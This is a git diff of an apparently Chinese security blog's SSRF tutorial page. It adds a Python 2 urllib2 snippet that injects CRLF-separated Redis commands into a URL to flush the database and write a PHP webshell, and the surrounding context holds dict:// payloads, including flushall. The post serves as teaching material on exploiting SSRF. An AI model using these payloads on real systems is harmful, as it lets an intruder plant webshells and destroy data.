@@ -442,14 +442,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.7k
+                    5.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    23 分
+                    24 分
                 </div>
                 
 
@@ -852,10 +852,17 @@ dict<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token shell-comment comment"># 如果脏数据过大导致webshell无法执行,可以清除当前数据库所有key(有风险)</span>
 dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.200.97:6379/flushall                         </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>使用Gopher协议利用Redis写Webshell:<br>将要执行的命令整体URL编码:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/5310088417592c70510eead611e3fcc2.png"><br>发起请求：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/25700f753cf10284ca1e84ad35f9606d.png"></p>
-<h2 id="0x08-SSRF测试工具"><a href="#0x08-SSRF测试工具" class="headerlink" title="0x08 SSRF测试工具"></a>0x08 SSRF测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">SSRFmap-master</a> - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/292f7cbbf33e6f327425ae1ef9f5f0b1.png"><br>帮助说明如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a2c9a0836d3f09355295d68673b81e3.png"><br>比如可以</p>
+<p>如果SSRF的触发点错误的处理HTTP请求，那么也可以结合请求走私利用。比如python2的urllib2模块：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+<span class="token keyword">import</span> urllib2
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?>'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"</span>
+html <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/506efa2ac99f171ea3c96a5757237ab6.png"><br>利用redis写shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/495fb05f23dac828ba3835bde7bd5553.png"></p>
+<h2 id="0x08-SSRF测试工具"><a href="#0x08-SSRF测试工具" class="headerlink" title="0x08 SSRF测试工具"></a>0x08 SSRF测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">SSRFmap-master</a> - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/292f7cbbf33e6f327425ae1ef9f5f0b1.png"><br>帮助说明如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a2c9a0836d3f09355295d68673b81e3.png"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing-master</a> - 常用的SSRF绕过测试<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d1d2e18e21355cd082602c708d984ef6.png"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a> - 将请求转换为gopher协议格式<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/97ae994b6040c78407f065ecdfaf9f37.png"></p>
-<h2 id="0x09-参考资料"><a href="#0x09-参考资料" class="headerlink" title="0x09 参考资料"></a>0x09 参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a target="_blank" rel="noopener" href="https://github.com/cujanovic/SSRF-Testing/">https://github.com/cujanovic/SSRF-Testing/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/269208311">七大主流的HttpClient程序比较</a><br><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a></p>
+<h2 id="0x09-参考资料"><a href="#0x09-参考资料" class="headerlink" title="0x09 参考资料"></a>0x09 参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.shorturl.at/">https://www.shorturl.at/</a><br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a><br><a target="_blank" rel="noopener" href="https://github.com/cujanovic/SSRF-Testing/">https://github.com/cujanovic/SSRF-Testing/</a><br><a target="_blank" rel="noopener" href="https://www.xudongz.com/blog/2017/idn-phishing/">https://www.xudongz.com/blog/2017/idn-phishing/</a><br><a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/269208311">七大主流的HttpClient程序比较</a><br><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">blind-ssrf-chains</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1529,7 +1536,7 @@ dict<span class="token punctuation">:</span><span class="token comment" spellche
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">20.7k</span>&nbsp;字
+                class="white-color">20.8k</span>&nbsp;字
             
             
             
